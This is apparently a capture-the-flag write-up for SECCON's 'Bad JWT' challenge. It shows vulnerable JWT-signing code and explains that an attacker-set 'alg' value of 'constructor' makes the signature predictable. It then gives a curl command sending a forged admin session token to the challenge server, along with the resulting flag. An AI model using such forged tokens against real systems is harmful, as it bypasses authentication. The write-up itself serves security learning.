# Bad JWT

## Vulnz

```
const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
const signature = algorithms[header.alg.toLowerCase()](data, secret);
```

`header.alg.toLowerCase()` is controllable, so we can use `constructor` to control the value of `signature`.

## Exploit

```
curl -H "Cookie: session=eyJhbGciOiJjb25zdHJ1Y3RvciIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlfQ==.eyJhbGciOiJjb25zdHJ1Y3RvciIsInR5cCI6IkpXVCJ9ＮeyJpc0FkbWluIjp0cnVlfQ" http://bad-jwt.seccon.games:3000/
```

=>

`SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}`
